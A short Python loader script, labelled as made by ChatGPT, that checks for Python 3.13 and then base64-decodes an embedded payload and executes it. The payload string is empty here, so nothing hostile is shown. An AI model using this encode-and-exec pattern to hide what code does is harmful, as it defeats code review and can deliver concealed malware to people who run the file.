
# Encode File BY : ChatGPT
import sys, os, base64

PYTHON_VERSION = ".".join(sys.version.split()[0].split(".")[:-1])

if PYTHON_VERSION != '3.13':
    print("[!] Python sürümü uyumsuz")
    exit(0)

payload = ''
code = base64.b64decode(payload).decode("utf-8")
exec(compile(code, "<embedded>", "exec"))

